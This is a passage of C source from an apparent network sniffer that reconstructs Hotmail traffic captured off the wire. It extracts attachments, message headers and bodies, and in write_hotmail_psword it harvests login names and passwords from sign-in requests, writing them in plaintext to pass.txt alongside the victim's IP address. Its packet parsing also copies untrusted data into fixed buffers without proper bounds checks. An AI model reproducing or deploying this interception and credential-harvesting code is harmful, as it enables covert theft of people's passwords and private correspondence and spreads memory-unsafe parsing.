		{////printf("\n2\n");
			attach_info->recive_length = 0;
			
			char *p = strstr(data, "\r\nContent-Length: ");
			if (p == NULL)
			{
				attach_info->recive_length = 5000;
			}
			else
			{
				p += 18;
				while( *p != '\r') 
				{
					attach_info->recive_length = attach_info->recive_length * 10 + (*p - '0');
					p++;
				}
			}
			//mail_info->attach_len = mail_info->recive_length;
			if (attach_info->recive_length <= 0) 
				return -1;
			
			attach_info->recive_length += 1000;
			if(strstr(data,"------"))
			{
// 				//printf("\n22\n");
				attach_info->recive_data = (char *)malloc(attach_info->recive_length);
				if(attach_info->recive_data == NULL) 
					return -1;
				memset(attach_info->recive_data,0,attach_info->recive_length);
				
				attach_info->start_seq = seq; 
				memcpy(attach_info->recive_data, data, data_len);
			}
		}
		else 
		{////printf("\n3\n");
			if(strstr(data,"------") && /*attach_info->recive_data == NULL*/!attach_info->is_writing)
			{
// 				//printf("\n33\n");
				attach_info->recive_data = (char *)malloc(attach_info->recive_length);
				if(attach_info->recive_data == NULL) 
					return -1;
				memset(attach_info->recive_data,0,attach_info->recive_length);
				
				attach_info->start_seq = seq; 
				memcpy(attach_info->recive_data, data, data_len);
				attach_info->is_writing = 1;
			}
			if(/*(attach_info->recive_data != NULL)*/attach_info->is_writing && data_len)
			{////printf("\n4\n");
				off_seq = seq - attach_info->start_seq;
				if (off_seq+ data_len > attach_info->recive_length) 
				{
					attach_info->recive_data = (char *)realloc(attach_info->recive_data,attach_info->recive_length+((off_seq+ data_len-attach_info->recive_length)/5000+1)*5000);
					if(attach_info->recive_data == NULL)
						return -1;
 					attach_info->recive_length+=((off_seq+ data_len-attach_info->recive_length)/5000+1)*5000;
					memcpy(attach_info->recive_data + off_seq, data, data_len); 
				}
				else
				{
					memcpy(attach_info->recive_data + off_seq, data, data_len);
				}
			}
		
		}
		if(attach_info->recive_data != NULL && !attach_info->is_get_ok)
		{////printf("\n5\n");
			if(ptcp->fin)
			{////printf("\n6\n");
				attach_info->is_get_ok=1;
				attach_info->is_complished =1;
				char *p1 = strstr(attach_info->recive_data, "filename=\"");

				if(p1 == NULL)
				{
					////printf("p1 == NULL\n");
					return -1;
				}
				p1+=10;
				char *p2=strstr(p1,"\"\r\n");
				if(p2 == NULL)
				{
					////printf("p2 == NULL\n");
					return -1;
				}
				strncpy(attach_info->attach_name,p1,p2-p1);//the name of attach file
// 				//printf("attach_info->attach_name 4 : %s\n",attach_info->attach_name);
				p1=strstr(p1,"\r\n\r\n");
				if(p1 == NULL)
				{
					////printf("p11111 == NULL\n");
					return -1;
				}
				p1+=4;
				p2 = memfind(p1, "\r\n------", attach_info->recive_length-(p1-attach_info->recive_data)-1000);
				//p2=strstr(p1,"\r\n----------");
				if(p2 == NULL)
				{	////printf("p22222 == NULL\n");
					return -1;
				}
				struct timeval tv;//creat temp attach file
				struct timezone tz;
				gettimeofday(&tv,&tz);
				sprintf(attach_info->path_of_here,"%s/%lu-%lu",mail_temp_path,tv.tv_sec,tv.tv_usec); //3
				mode_t  file_mode = S_IRUSR |S_IWUSR|S_IRGRP|S_IROTH;
				int fd = open(attach_info->path_of_here,O_RDWR|O_CREAT,file_mode);

				if (fd ==-1)
				{
					////printf("fd ==-1\n");
					return -1;
				}
				write(fd,p1,p2-p1);
				close(fd);
				attach_info->is_writing = 0;
			}
		} 
	}
	else
	{////printf("\n7\n");
		if(!attach_info->is_get_ok)
		{////printf("\n8\n");

			char http_ok_head[21]="HTTP/1.1 ";
			if(!strncmp(data,http_ok_head,9))
			{////printf("\n9\n");//printf("attach_info->recive_data = %s\n",attach_info->recive_data);
				attach_info->is_get_ok=1;
				char *p1 = strstr(attach_info->recive_data, "filename=\"");

				if(p1 == NULL)
				{
					////printf("p1 == NULL\n");
					return -1;
				}
				p1+=10;
				char *p2=strstr(p1,"\"\r\n");
				if(p2 == NULL)
				{
					////printf("p2 == NULL\n");
					return -1;
				}
				strncpy(attach_info->attach_name,p1,p2-p1);//the name of attach file
				attach_info->attach_name[p2 - p1] = 0;
				//printf("attach_info->attach_name :%s \n",attach_info->attach_name);
				p1=strstr(p1,"\r\n\r\n");
				if(p1 == NULL)
				{
					////printf("p11111 == NULL\n");
					return -1;
				}
				p1+=4;////printf("\nattach_info->recive_length-(p1-attach_info->recive_data)-1000 = %d\np1 = %s\n",attach_info->recive_length-(p1-attach_info->recive_data)-1000,p1);
				p2 = memfind(p1, "\r\n------", attach_info->recive_length-(p1-attach_info->recive_data)-1000);////printf("\np2 = %s\n",p2);
				//p2=strstr(p1,"\r\n----------");
				if(p2 == NULL)
				{	////printf("p22222 == NULL\n");
					return -1;
				}
				struct timeval tv;//creat temp attach file
				struct timezone tz;
				gettimeofday(&tv,&tz);
				sprintf(attach_info->path_of_here,"%s/%lu-%lu",mail_temp_path,tv.tv_sec,tv.tv_usec); //3
				mode_t  file_mode = S_IRUSR |S_IWUSR|S_IRGRP|S_IROTH;
				int fd = open(attach_info->path_of_here,O_RDWR|O_CREAT,file_mode);

				if (fd ==-1)
				{
					////printf("fd ==-1\n");
					return -1;
				}
				write(fd,p1,p2-p1+102);
				close(fd);
				attach_info->is_writing = 0;
				////////////////////////////////////////////////////////////
				int len;
				char *p3 = NULL;
				
				////printf("2 .. 1 .. 1\n");
			
				trim_hotmail_attach(attach_info->path_of_here);
				trim_attach(attach_info->path_of_here, 102);
				len = get_http_length(data);
				attach_info->ok_len = len;
				len += 100;  //12
				if (len <= 0) 
				{
					return -1;
				}
				////printf("2 .. 1 .. 2\n");
				if (strstr(data, "\r\nContent-Encoding: gzip\r\n")) 
				{
					attach_info->ok_gzip = 1;
				} 
				else 
				{
					attach_info->ok_gzip = 0;
				}

                if (attach_info->ok_data)
                {
                    free(attach_info->ok_data);
                    attach_info->ok_data = NULL;
                }
                
				attach_info->ok_data = (char *)malloc((size_t)(len + 1));
				if (attach_info->ok_data == NULL)
					return -1;
				////printf("2 .. 1 .. 3\n");
				memset(attach_info->ok_data, 0, len + 1);
				p3 = strstr(data, "\r\n\r\n");
				p3 += 4;
				len = data_len - (p3 - data);
				if (len > attach_info->ok_len)
					return -1;
				////printf("2 .. 1 .. 4\n");
				memcpy(attach_info->ok_data, p3, len);
				attach_info->ok_start_seq = seq + p3 - data;

				if (strstr(p3, "</html>") != NULL || !memcmp(data + data_len - 2, "\0\0", 2)) 
				{
					////printf("2 .. 1 .. 5\n");
					char *dest;
					if (attach_info->ok_gzip) 
					{
						result = decomp_gzip(attach_info->ok_data, attach_info->ok_len - 1, &dest);
						if (result == -1)
						{
							return -1;
						}
					}
					////printf("2 .. 1 .. 6\n");
					attach_info->is_get_ok = 0;
					attach_info->is_complished = 1;
					char ID_str[MAX_ID_LEN + 1];
					result = regcompile_1(dest, "attachmentsPostBack(.*)','", ID_str, MAX_ID_LEN);
					char * p4 = ID_str;
					char * p5 = strstr(p4,"\\x2f");
					p5 = strstr(p5,"\\x7c");
					p5 += 4;
					memcpy(attach_info->ID_str, p5, 36);
					attach_info->ID_str[36] = 0;
                    
                                //printf("attach_id:%s\n", attach_info->ID_str);
					////printf("hotmail attach ID : %s\n", attach_info->ID_str);
					/*p5 += 36;
					p4 = strstr(p5,"\\x7c");
					char temp_name[MAX_PATH_LEN +1];
					strncpy(temp_name,p5,p4-p5);
					char *attachname = UCS2ToUTF8_mail(temp_name , p5 - p4);
					if(attachname != NULL) 						
						memcpy(attach_info->attach_name , attachname , strlen(attachname));
					
					attach_info->attach_name[strlen(attachname)]=0;
					//printf("attach_info->attach_name 1 :%s \n",attach_info->attach_name);*/
					free(dest);
					////printf("2 .. 1 .. 7\n");
				}
			}
		}
		else 
		{
			////printf("2 .. 2\n");
			int off_seq = seq - attach_info->ok_start_seq;
			if (off_seq + data_len > attach_info->ok_len)
				return -1;
			memcpy(attach_info->ok_data + off_seq, data, data_len);
			////printf("2 .. 2 .. 1\n");
			////printf("%s\n", data);
			if (strstr(data, "</html>") != NULL || !memcmp(data + data_len - 2, "\0\0", 2)) 
			{
				////printf("2 .. 2 .. 2\n");
				char *dest;

				if (attach_info->ok_gzip) 
				{
					result = decomp_gzip(attach_info->ok_data, attach_info->ok_len - 1, &dest);
					if (result == -1) 
					{
						return -1;
					}
				}
				////printf("2 .. 2 .. 3\n");
				attach_info->is_get_ok = 0;
				attach_info->is_complished = 1;
				////printf("IDD1 : %s\n", attach_info->ID_str);
				////printf("\n%s\n", dest);
				char ID_str[MAX_ID_LEN + 1];
				result = regcompile_1(dest, "attachmentsPostBack(.*)','", ID_str, MAX_ID_LEN);
				char * p1 = ID_str;
				char * p2 = strstr(p1,"\\x2f");
				p2 = strstr(p2,"\\x7c");
				p2 += 4;
				memcpy(attach_info->ID_str, p2, 36);
				attach_info->ID_str[36] = 0;

				free(dest);
				dest = NULL;
				if (result == -1) 
				{
					return -1;
				}

			}
			
			////printf("2 .. 2 .. 5\n");

			return 0;
		}
	}	
}

int analyse_hotmail_down_attach(Attach_info *attach_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	unsigned int seq = ntohl(ptcp->seq);
	static int getted_size, attach_size;
	int result;
	if (attach_info->is_writing == 1)
	{
		if(attach_info->ok_length < attach_info->recive_length)
		{
		
			result = write_to_attach(attach_info, data, data_len, seq);
			attach_info->ok_length += data_len;
		}
		if(attach_info->ok_length >= attach_info->recive_length /*|| ptcp->fin == 1*/)
		{
			
		//	//printf("getted_size  : %d  attach_size :%d\n",attach_info->ok_length ,attach_info->recive_length);
			UpdateAttachNew(attach_info->attach_name, attach_info->attname, attach_info->ID_str);
			//getted_size = 0;
			//attach_size = 0;
			return -1;
		}
		////printf("getted_size : %d\n", getted_size);
	}
	else
	{
		if(!strncmp(data, "HTTP/1.1 200 OK\r\n", 17))
		{
			/*if(!strstr(data , "Connection: close"))
				return -1;*/
			struct timeval tv;
			struct timezone tz;
			char * front,* back;
			int len, fd;
			mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;
			
			front = strstr(data, "; filename");
			if(front == NULL)
			{
				return 0;
			}
			front += 10;
			front = strstr(front, "\"");
			front += 1;
			back = strstr(front, "\"\r\n");
			if(back == NULL)
			{
				return 0;
			}
			len = back - front;
			len = (len > MAX_PATH_LEN ? MAX_PATH_LEN : len);
			memcpy(attach_info->attach_name, front, len);
			attach_info->attach_name[len] = 0;
			memcpy(attach_info->attname, front, len);
			attach_info->attname[len] = 0;
			
			htmldecode_full(attach_info->attach_name, attach_info->attach_name);
			htmldecode_full(attach_info->attname, attach_info->attname);
			gettimeofday(&tv, &tz);
			snprintf(attach_info->path_of_here, MAX_PATH_LEN, "%s/%lu-%lu",
    				attach_down_path, tv.tv_sec, tv.tv_usec);
			////printf("attach_info->path_of_here : %s\n", attach_info->path_of_here);
			
			char temp_name[MAX_PATH_LEN];
			memset(temp_name, MAX_PATH_LEN, 0);
			strcpy(temp_name, attach_info->attach_name);
			temp_name[len] = '\0';
			snprintf(attach_info->attach_name, MAX_PATH_LEN, "%lu-%lu", tv.tv_sec, tv.tv_usec);
		//	//printf("attach_info->attname : %s\n", attach_info->attname);
			
			front = strstr(data, "Content-Length: ");
			if(front == NULL)
			{
				return 0;
			}
			front += 16;
			back = strstr(front, "\r\n");
			if(back == NULL)
			{
				return 0;
			}
			char size_str[16];
			memset(size_str, 0, 16);
			len = back - front;
			len = (len > MAX_PATH_LEN ? MAX_PATH_LEN : len);
			memcpy(size_str, front, len);
			size_str[len] = '\0';
			attach_info->recive_length = strtonum(size_str);
			
		//	//printf("attach_info->recive_length : %d\n", attach_info->recive_length);
			
			front = strstr(data, "Content-Type: ");
			if(front == NULL)
			{
				return 0;
			}
			front += 14;
			front = strstr(front, "\r\n\r\n");
			if(front == NULL)
			{
				return 0;
			}
			front += 4;
			attach_info->start_seq = seq + (front - data);
			fd = open(attach_info->path_of_here, O_RDWR|O_CREAT, file_mode);
			if (fd == -1)
			{
				return -1;
			}
			attach_info->ok_length = data_len - (front - data);
			write(fd, front, attach_info->ok_length);
			close(fd);
			
		//	//printf("attach_info->ok_length first : %d\n", attach_info->ok_length);
			
			attach_info->is_writing = 1;

			if (attach_info->is_writing == 1)
			{
				if(attach_info->ok_length < attach_info->recive_length)
				{
				
					result = write_to_attach(attach_info, data, data_len, seq);
					attach_info->ok_length += data_len;
				}
				
				if(attach_info->ok_length >= attach_info->recive_length /*|| ptcp->fin == 1*/)
				{
					
				//	//printf("getted_size  : %d  attach_size :%d\n",attach_info->ok_length ,attach_info->recive_length);
					UpdateAttachNew(attach_info->attach_name, attach_info->attname, attach_info->ID_str);
					//getted_size = 0;
					//attach_size = 0;
					return -1;
				}
				////printf("getted_size : %d\n", getted_size);
			}
	
		}
		else
		{
			char *p1, *p2;
			p1 = strstr(data, "Referer:");
			if(p1)
			{
				p1 += 8;
				p1 = strstr(p1, "n=");
				//p1 = strstr(data, "blob=");
				if(p1)
				{
					p1 += 2;
					p2 = strstr(p1, "\r\n");
                    if (!p2)
                        return -1;
                    char *ptmp = p2;
                    p2 = memfind (p1, "&", ptmp - p1);
                    if (!p2)
                        p2 = ptmp;

    				int len = p2 - p1;
    				memcpy(attach_info->ID_str, p1, len);
    				attach_info->ID_str[len] = 0;
    				htmldecode_full(attach_info->ID_str, attach_info->ID_str);
    				//LOG_INFO("attach_info->ID_str :%s \n",attach_info->ID_str);
				}
                else
                {
                    strcpy(attach_info->ID_str, "hotmail_554101587");
                }
                        
			}
		}
	}
	
	return 0;
}

#if 0
int get_hotmail_hex(char *data)
{
    char * pstart = NULL;
    char * pend = NULL;
    char * phead = "<td class=ReadMsgHeaderCol1>";
	pstart = strstr(data, phead);
	if (NULL == pstart)
	{
		
		return -1;
	}
	pstart += 28;
	pend = strstr(pstart, "</td>");
	if (NULL == pend)
		return -1;
	//printf("from:");
	output_packet(pstart, pend - pstart);
	//printf("\n");
	
	pstart = strstr(pend, phead);
	if (NULL == pstart)
	{
		
		return -1;
	}
	pstart += 28;
	pend = strstr(pstart, "</td>");
	if (NULL == pend)
		return -1;
	//printf("time:");
	output_packet(pstart, pend - pstart);
	//printf("\n");

	pstart = strstr(pend, phead);
	if (NULL == pstart)
	{
		
		return -1;
	}
	pstart += 28;
	pend = strstr(pstart, "</td>");
	if (NULL == pend)
		return -1;
	//printf("to");
	output_packet(pstart, pend - pstart);
	//printf("\n");

    pstart = strstr(pend, phead);
	if (NULL == pstart)
	{
		
		return -1;
	}
	pstart += 28;
	pend = strstr(pstart, "</td>");
	if (NULL == pend)
		return -1;
	//printf("cc");
	output_packet(pstart, pend - pstart);
	//printf("\n");

}
#endif
char *get_hotmail_to(Mail_info *mail_info, char *data)
{
/*
	�����ˣ�e5  8f  91  e4  bb  b6  e4  ba  ba  ef  bc  9a
	����ʱ�䣺e5  8f  91  e9  80  81  e6  97  b6  e9  97  b4  ef  bc  9a
	�ռ��ˣ�e6  94  b6  e4  bb  b6  e4  ba  ba  ef  bc  9a
	�����ˣ�e6  8a  84  e9  80  81  ef  bc  9a
	
*/
    
    char *pstart = NULL;
    char *pend = NULL;
    pstart = strstr(data, "<div class=\\\"ReadMsgHeader\\\">");
    if (NULL == pstart)
        return NULL;
    
    //get_hotmail_hex(pstart);
    char *ptmp = NULL;
    char *pptemp = NULL;
    char *pptemp2 =NULL;
    char *pflag = NULL;
    int buf_len = 0;
    char *phead = "<tr class=Header><td class=ReadMsgHeaderCol1>";

    pstart = strstr(pstart, phead);//sender
    if (NULL == pstart)
        return NULL;
    
    pstart += 45;
    pstart = strstr(pstart, phead);//time
    if (NULL == pstart)
        return NULL;
    
    pstart += 45;
    pstart = strstr(pstart, phead);//to
    if (NULL == pstart)
        return NULL;
    
    pstart += 45;
	pstart = strstr(pstart, "<td>");
	if (NULL == pstart)
	{
		return NULL;
	}
    
    pstart += 4;
    pend = strstr(pstart, "</td>");
    buf_len = pend - pstart;
    ptmp = (char *)malloc(buf_len);
    if (NULL == ptmp)
    {
        return NULL;
    }
    
	memcpy(ptmp, pstart, buf_len);
	pflag = pend;
    pptemp2 = ptmp;
    pstart = ptmp;
    pend = NULL;
	int len = 0;
    
	while (1)
	{
        pptemp = strstr(pptemp2, "&#59;");
        if (NULL == pptemp)
        {
            if (NULL == pend)
            {
                pend = ptmp + buf_len;
                pptemp = memfind(ptmp, "&#40;", buf_len);
            }
            else
                pptemp = memfind(pend, "&#40;", buf_len-(pend-ptmp));
            
            if (pptemp != NULL)
            {
                pstart = pptemp;
                pstart += 5;
                pend = strstr(pstart, "&#41;");
                if (NULL == pend)
                {
                    return NULL;
                }
            }

            int tmplen = pend - pstart;
            if (len + tmplen > MAX_TO_LEN)
                return NULL;
            
            memcpy(mail_info->to + len, pstart, tmplen);
            mail_info->to[len + tmplen+1] = 0;
            break;
        }
        else
        {
            pptemp2 = pptemp+5;
            if (NULL == pend)
            {
                pend = ptmp + buf_len;
                pptemp = memfind(ptmp, "&#40;", pptemp - ptmp);
            }
            else
                pptemp = memfind(pend, "&#40;", pptemp - pend);
            
            if (pptemp != NULL)
            {
                pstart = pptemp;
                pptemp = pend;
                pstart += 5;

                pend = strstr(pstart, "&#41;");
                if (NULL == pend)
                {

                return NULL;
                }
            }             

            int tmplen = pend - pstart;
            if (len + tmplen > MAX_TO_LEN)
                return NULL;

            memcpy(mail_info->to + len, pstart, tmplen);
            strcat(mail_info->to, ";");
            len += tmplen + 1;
        }
	}
	free(ptmp);
	ptmp = NULL;
    
    pstart = strstr(pflag, phead);//cc
    if (NULL != pstart)
    {
        pstart += 45;
        pstart = strstr(pstart, "<td>");
        if (NULL == pstart)
        {
        	return NULL;
        }
        
        pstart += 4;
        pend = strstr(pstart, "</td>");
        if (NULL == pend)
        {
            return NULL;
        }
        
        buf_len = pend - pstart;
  
        ptmp = (char *)malloc(buf_len);
        if (NULL == ptmp)
        {
            return NULL;
        }
        memcpy(ptmp, pstart, pend - pstart);
        pflag = pend;
        pptemp2 = ptmp;
        pstart = ptmp;
        pend = NULL;
        len = 0;
        
        while (1)
        {
            pptemp = strstr(pptemp2, "&#59;");
            if (NULL == pptemp)
            {
                if (NULL == pend)
                {
                    pend = ptmp + buf_len;
                    pptemp = memfind(ptmp, "&#40;", pend - pstart);
                }
                else
                    pptemp = memfind(pend, "&#40;", buf_len-(pend-ptmp));
                
                if (pptemp != NULL)
                {
                    pstart = pptemp;
                    pptemp = pend;
                    pstart += 5;

                    pend = strstr(pstart, "&#41;");
                    if (NULL == pend)
                    {
                    
                    return NULL;
                    }
                }
                
                int tmplen = pend - pstart;
                if (len + tmplen > MAX_CC_LEN)
                    return NULL;
                
                memcpy(mail_info->cc + len, pstart, tmplen);
                mail_info->cc[len + tmplen+1] = 0;

                break;

            }
            else
            {
                pptemp2 = pptemp + 5;
                if (NULL == pend)
                {
                    pend = ptmp + buf_len;
                    pptemp = memfind(ptmp, "&#40;", pptemp - ptmp);
                }
                else
                  pptemp = memfind(pend, "&#40;", pptemp - pend);
                
                if (pptemp != NULL)
                {
                    pstart = pptemp;
                    pptemp = pend;
                    pstart += 5;

                    pend = strstr(pstart, "&#41;");
                    if (NULL == pend)
                    {
                        
                        return NULL;
                    }
                }         

                int tmplen = pend - pstart;
                if (len + tmplen > MAX_CC_LEN)
                    return NULL;

                memcpy(mail_info->cc + len, pstart, tmplen);
                strcat(mail_info->cc, ";");
                len += tmplen +1;
            }
        }
        free(ptmp);
        ptmp= NULL;
    }
	
	return pflag;
}

int writefile_hotmail_rcvmail(Mail_info *mail_info)
{
	char *pstart = NULL;
	char *pend = NULL;
	char *p = NULL;
	char *tmp_str = NULL;
	size_t len;
	int result;

    /*Get id*/

    //<div id=\"\" class=\"AttachmentRow\">
	if(mail_info->recive_data == NULL)
	{
		return -1;
	}
        
	pstart = strstr(mail_info->recive_data, "class=ReadMsgSubject>");//search 主�?
	if (pstart == NULL)
	{
		return -1;
	}
	pstart += 21;
	pend = strstr(pstart, "<");
	if (pend == NULL)
	{
		return -1;
	}
	len = pend - pstart;
	len = (len > MAX_SUBJ_LEN ? MAX_SUBJ_LEN : len);
	memcpy(mail_info->subject, pstart, len-8);
	mail_info->subject[len] = 0;

	pstart = strstr(mail_info->recive_data, "ca=\\\"");  //search ??件人
	if (pstart == NULL)
	{
		return -1;
	}
	pstart += 5;
    pend = strstr(pstart, "\\\"");
    if (pend == NULL)
	{
        return -1;
	}
    
	len = pend - pstart;
	len = (len > MAX_FROM_LEN ? MAX_FROM_LEN : len);
	memcpy(mail_info->from, pstart, len);
	mail_info->from[len] = 0;

	pstart = strstr(mail_info->recive_data, "\xe5\x8f\x91\xe9\x80\x81\xe6\x97\xb6\xe9\x97\xb4\xef\xbc\x9a</td>");//search ?????��??
	if (pstart == NULL)
	{
		pstart = strstr(mail_info->recive_data, "Sent:</td>");
		if(pstart == NULL)
		{
			return -1;
		}
		pstart += 10;
	}
	else
	{
		pstart += 20;
	}
	pstart = strstr(pstart, "<td>");
	if (pstart == NULL)
	{
		return -1;
	}
	pstart += 4;
	pend = strstr(pstart, "<");
	if (pend == NULL)
	{
		return -1;
	}
	len = pend - pstart;
	len = (len > MAX_TIME_LEN ? MAX_TIME_LEN : len);
	memcpy(mail_info->sent_time, pstart, len);
	mail_info->sent_time[len] = 0;
	
#if 0
	pstart = strstr(mail_info->recive_data, "class=ReadMsgTo>");  //search ?�件��?
	
	if (pstart == NULL)
	{
		////printf("pstart6 == NULL\n");
		return -1;
	}

	pstart += 16;
	pstart += 32;
	pend = strstr(pstart, "<");
	if (pend == NULL)
	{
		////printf("pstart7 == NULL\n");
		return -1;
	}
	len = pend - pstart;
	len = (len > MAX_TO_LEN ? MAX_TO_LEN : len);
	char to[MAX_TO_LEN + 1];
	memcpy(to, pstart, len);
	to[len] = 0;
	
	if (strstr(to, ", "))
	{
		pend = strstr(pstart, ", ");
		len =pend - pstart;
		len = (len > MAX_TO_LEN ? MAX_TO_LEN : len);
		memcpy(mail_info->to, pstart, len);
		mail_info->to[len] = 0;
		pend += 2;
		pstart = strstr(pend, "<");
		len = pstart - pend;
		memcpy(mail_info->cc, pend, len);
		mail_info->cc[len]=0;
		/*pend += 2;
		pstart = strstr(pend, "");
		if (pstart == NULL)
		{
			////printf("pstart8 == NULL\n");
			return -1;
		}
		pstart += 4;
		pend = strstr(pstart, "<");
		if (pend == NULL)
		{
		////printf("pstart9 == NULL\n");
		return -1;
		}
		len = pend - pstart;
		len = (len > MAX_CC_LEN ? MAX_CC_LEN : len);
		memcpy(mail_info->cc, pstart, len);
		mail_info->cc[len] = 0;*/
		////printf("\nmail_info->cc : %s\n", mail_info->cc);
	}
	else
	{
		memcpy(mail_info->to, pstart, len);
		mail_info->to[len] = 0;
	}
#endif
	get_hotmail_to(mail_info, mail_info->recive_data);
	////printf("\nmail_info->to : %s\n", mail_info->to);
	pstart = strstr(mail_info->recive_data, "MsgContainer\\\">");
	if (pstart == NULL)
	{
		////printf("333333\n");
		return -1;
	}
	pstart += 15;
	p = strstr(pstart, "</div>");
	//p = strstr(pstart, "\\r\\n\\r\\n\\r\\n");
	if (p == NULL)
	{
		////printf("pstart10 == NULL\n");
		return -1;
	}
	//*pend = 0;
	p+=6;
	*p = 0;
	mail_info->content = strdup(pstart);
	
	result = hotmail_str_convert2(mail_info->from, MAX_FROM_LEN);
	if (result == -1)
		return -1;
	result = hotmail_str_convert2(mail_info->to, MAX_TO_LEN);
	if (result == -1)
		return -1;
	result = hotmail_str_convert2(mail_info->sent_time, MAX_TIME_LEN);
	if (result == -1)
		return -1;
	result = hotmail_str_convert2(mail_info->cc, MAX_CC_LEN);
	if (result == -1)
		return -1;
	result = hotmail_str_convert2(mail_info->subject, MAX_SUBJ_LEN);
	if (result == -1)
		return -1;

	tmp_str = clear_html_tag(mail_info->content);
	if (tmp_str == NULL)
	{
		return -1;
	}
	free(mail_info->content);
	mail_info->content = hotmail_conv_to_utf8(tmp_str);
	free(tmp_str);
	tmp_str = NULL;
	if (mail_info->content == NULL)
	{
		return -1;
	}
	////printf("mail_info->content2 = %s\n", mail_info->content);
	//down_content(&mail_info->content);
	
	pstart = strstr(mail_info->content, "\\r\\n\\r\\n\\r\\n\\r\\n");
	if (pstart)
	{
		//output_packet(pstart, strlen(pstart));
		pstart += 16;
		pend = strstr(pstart , " \\t\\t \\t   \\t\\t  ");
		if (NULL == pend)
		{
			
			memcpy(mail_info->content , pstart ,strlen(pstart)+1);
			mail_info->content[strlen(pstart)+1] = 0;
			
		}
		else
		{
			memcpy(mail_info->content , pstart ,pend - pstart);
			mail_info->content[pend - pstart] = 0;
		}
		
		char *tmp_p = NULL;
		tmp_p = clear_rec_content(mail_info->content);
		free(mail_info->content);
		mail_info->content = tmp_p;
	}

// 	//printf("\nmail_info->content : %s\n", mail_info->content);
	clear_from(mail_info->from);
	//output_mail(mail_info);
	create_dir(mail_info->save_path, "hotmail", mail_info->from);
	write_to_file(mail_info);
}

//\"biciPrevious\":\"2970d25a-5ec2-40ae-acc2-d7b289eb4df5_09b9367aaa9_5698\",\"BICI\":
//biciPrevious=2970d25a-5ec2-40ae-acc2-d7b289eb4df5_09b9367aaa9_5698&hm

int analyse_hotmail_rcvmail(Mail_info *mail_info,char *data,unsigned int data_len,struct tcphdr *ptcp,int is_to_s)
{
	int result;
	char *dest = NULL;
	static int flag = -1;
	
	if (is_to_s) 
	{         
		char * ii, *jj;
		ii = strstr(data, "Referer:");
		if(ii)
		{
			ii += 8;
			ii = strstr(ii, "n=");
			if(ii)
			{
				ii += 2;
                jj = strstr(ii, "\r\n");
                if (!jj)
                    return -1;
                char *ptmp = jj;
                jj = memfind (ii, "&", ptmp - ii);
                if (!jj)
                    jj = ptmp;
				int len = jj - ii;
				memcpy(mail_info->mail_id, ii, len);
				mail_info->mail_id[len] = 0;
				//LOG_INFO("mail_info->mail_id : %s\n", mail_info->mail_id);
			}
            else
            {
                strcpy(mail_info->mail_id, "hotmail_554101587");
            }
		
		}
		if (!mail_info->is_complished) 
		{
			result = write_to_mail(mail_info, data, data_len, ptcp);
			return result;
		}
	} 
	else 
	{////printf("is_to_s = %d",is_to_s);
    	    
		if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9))
		{
			if(strstr(data, "Transfer-Encoding: chunked\r\n")){////printf("\n1\n");
				flag = 1;}
			else{////printf("\n2\n");
				flag = 0;}
		}
		
		if (!mail_info->is_complished)
		{
			if(flag == 0)
			{
				////printf("\ngzip ...\n");//printf("\n%d,%s\n",data_len, data);
				result = write_to_okdata(mail_info, data, data_len, ptcp);
				mail_info->is_ok_chunked = 0;
			}
			else if(flag == 1)
			{
				////printf("\nchunked ...\n");
				result = write_to_okdata_chunked_gzip(mail_info, data, data_len, ptcp);
				mail_info->is_ok_chunked = 1;
			}
			else
			{
				return -1;
			}
		}
		
		if (data_len + ntohl(ptcp->seq) - mail_info->http_seq == mail_info->recive_length || memcmp(data + data_len - 2, "\0\0", 2) == 0 || data_len < 7 || memcmp(data + data_len - 7, "\r\n0\r\n\r\n", 7) == 0)
		{
			////printf("\n... data is over ...\n");
			mail_info->is_complished = 1;
			if (mail_info->is_ok_chunked)
			{
				Chunked(mail_info);
				result = decomp_gzip_3(mail_info->recive_data, mail_info->recive_length, &dest);
			}
			else
			{
				result = decomp_gzip(mail_info->recive_data, mail_info->recive_length - 2, &dest);
			}
            
			if (result == -1)
			{
				LOG_WARN("webmail:analyse_hotmail_rcvmail: decomp_gzip()return error\n");
				return -1;
			}
			
			if(NULL == dest)
			{
				//printf("webmail:analyse_hotmail_rcvmail: gzip error ,mail_info is NULL!!!\n");
				return -1;
			}
			free(mail_info->recive_data);
			mail_info->recive_data = dest;
			dest = NULL;
			
			/*char * i, * j;
			i = strstr(mail_info->recive_data, "msgHash=\\\"");
			if(i == NULL)
			{
				writefile_hotmail_rcvmail(mail_info);
				del_mail_node(mail_info);
				return 0;
			}
			i += 10;
			j = strstr(i, "\\\"");
			if(j == NULL)
				return -1;
			int len = j - i;
			memcpy(mail_info->mail_id, i, len);
			mail_info->mail_id[len] = 0;*/
			
			writefile_hotmail_rcvmail(mail_info);
			del_mail_node(mail_info);
		}
	}
	return 0;
}

void write_hotmail_psword(Mail_info *mail_info)
{
	char *p1 = NULL;
	char *p2 = NULL;
	char tmp_name[MAX_UN_LEN + 1];
	size_t len;
	
	p1 = strstr(mail_info->mail_data, "login=");
	if(p1 == NULL)
	{
		return;
	}
	p1+=6;
	p2 = strstr(p1, "&passwd=");
	if(p2 == NULL)
	{
		return;
	}
	len = p2 - p1;
	memcpy(tmp_name, p1, len);
	tmp_name[len] = 0;
	htmldecode_full(tmp_name, mail_info->username);
	p2+=8;
	p1 = strstr(p2, "&");
	if(p1 == NULL)
	{
		return;
	}
	memset(mail_info->passwd, 0, MAX_UN_LEN+1);
	memcpy(mail_info->passwd, p2, p1 - p2);
	mail_info->passwd[p1 - p2] = 0;
	htmldecode_full(mail_info->passwd,mail_info->passwd);
	
        //printf("\nusernamess = %s and password = %s\n",mail_info->username,mail_info->passwd);
	write_xml(mail_info);

	FILE *fp;
//	chdir(mail_data_path);
        char passpath[MAX_PATH_LEN];
	sprintf(passpath,"%s/pass.txt",mail_data_path);
	fp=fopen(passpath,"a+");
	if(fp==NULL) return;
	fprintf(fp,"\nusername=%s\npassword=%s\n",mail_info->username,mail_info->passwd);
	fclose(fp);

	insert_array(mail_info->username, mail_info->source_ip);
}

int analyse_hotmail_psword(Mail_info *mail_info,char *data,unsigned int datalen,struct tcphdr *tcp,int is_b_s)
{
	if(is_b_s && (1 == http_recive_mail(mail_info, data, datalen)))
    {
        char* p1 = NULL, *p2 = NULL;
        char* tmp_data = mail_info->body;
        char tmp_name[MAX_UN_LEN + 1] = {0};
        char tmp_password[MAX_UN_LEN + 1] = {0};
        
        if(!tmp_data)
